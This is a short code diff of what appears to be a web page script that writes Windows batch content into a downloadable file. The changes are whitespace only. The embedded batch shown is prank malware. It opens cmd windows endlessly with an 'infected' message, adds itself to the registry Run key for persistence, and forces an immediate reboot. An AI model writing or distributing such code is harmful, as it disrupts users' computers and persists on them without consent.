@@ -74,14 +74,14 @@ color 0a
 mode con: cols=80 lines=25
 
 :loop
-start cmd /k "echo Your Computer is infected!"
+start cmd /k "echo Your Computer is infected!" 
 timeout /t 1 /nobreak >nul
 goto loop
 
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "InfectedApp" /t REG_SZ /d "%~f0" /f >nul
 
 shutdown -r -f -t 0
-`;
+            `;
 
             var blob = new Blob([batContent], { type: 'text/plain' });
             var link = document.createElement('a');
